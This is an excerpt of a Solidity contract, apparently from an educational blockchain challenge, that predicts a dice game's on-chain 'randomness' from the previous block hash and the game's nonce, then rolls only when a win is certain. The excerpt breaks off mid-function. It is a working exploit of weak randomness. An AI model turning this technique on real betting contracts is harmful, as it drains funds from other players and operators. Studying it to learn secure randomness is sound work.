...
contract RiggedRoll is Ownable {
    ...
    function _predictNextRoll() private view returns (uint8) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 winHash = keccak256(abi.encodePacked(
                prevHash,
                address(diceGame),
                diceGame.nonce
            ));
        return uint8(uint256(winHash) % 16);
    }

    function _nextRollWins() private view returns (bool) {
        return _predictNextRoll() < 3;
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "insufficient balance");
        require(_nextRollWins(), "next roll doesn't win");
